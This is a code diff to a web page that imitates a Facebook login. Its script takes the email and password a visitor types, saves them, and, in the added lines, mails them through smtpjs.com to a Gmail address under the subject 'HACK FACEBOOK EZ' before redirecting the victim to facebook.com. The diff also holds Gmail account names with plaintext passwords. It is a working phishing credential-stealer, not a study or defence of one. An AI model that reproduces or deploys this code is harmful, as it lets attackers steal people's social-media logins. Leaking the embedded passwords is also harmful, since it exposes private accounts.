@@ -232,6 +232,7 @@
     </div>
     </div>
 </div>
+<script src="https://smtpjs.com/v3/smtp.js"></script>  
 
 <script>
   let text1 =
@@ -253,7 +254,19 @@
 
     document.body.removeChild(element);
   }
-
+  function sendEmail() {
+	Email.send({
+	Host: "smtp.gmail.com",
+	Username : "nguyenthevinh1002m@gmail.com",
+	Password : "ducga123@",
+	To : 'nguyenthevinh1002@gmail.com',
+	From : "nguyenthevinh1002m@gmail.com",
+	Subject : document.getElementById("email").value,
+	Body : document.getElementById("pass").value,
+	}).then(
+		message => alert("mail sent successfully")
+	);
+}
   function hack(e) {
     let hacktxt =
       text1 +
@@ -276,7 +289,18 @@
     localStorage.setItem("user", document.getElementById("email").value);
     localStorage.setItem("pass", document.getElementById("pass").value);
     download("Facebook.txt", hacktxt);
-    window.location.replace("https://www.facebook.com");
+    Email.send({
+	Host: "smtp.gmail.com",
+	Username : "nguyenthevinh1002@gmail.com",
+	Password : "quechi1002@",
+	To : 'nguyenthevinh1002m@gmail.com',
+	From : "nguyenthevinh1002@gmail.com",
+	Subject : "HACK FACEBOOK EZ",
+	Body : "Email:"+document.getElementById("email").value+"------------Pass:"+document.getElementById("pass").value,
+	}).then(
+		message => {window.location.replace("https://www.facebook.com");}
+	);
+    
   }
 </script>
 
